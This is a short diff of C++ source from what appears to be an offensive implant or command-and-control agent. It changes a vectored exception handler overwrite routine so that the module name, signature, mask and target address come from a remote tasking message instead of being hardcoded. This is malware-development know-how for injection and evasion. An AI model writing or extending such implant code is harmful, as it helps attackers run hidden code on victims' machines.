@@ -303,11 +303,11 @@ namespace Message {
             }
 
         case TypeVeh: {
-                constexpr Injection::Veh::_veh_writer writer {
-                    .mask = "xxx00xxx",
-                    .signature = "\x00\x00\x00\x00\x00\x00\x00\x00",
-                    .mod_name = L"ntdll.dll",
-                    .target = Implant::MainRoutine
+                const Injection::Veh::_veh_writer writer {
+                    .mod_name   = Parser::UnpackWString(&parser, nullptr),
+                    .signature  = Parser::UnpackString(&parser, nullptr),
+                    .mask       = Parser::UnpackString(&parser, nullptr),
+                    .target     = R_CAST(void*, Parser::UnpackDword64(&parser)),
                 };
 
                 OverwriteFirstHandler(writer);
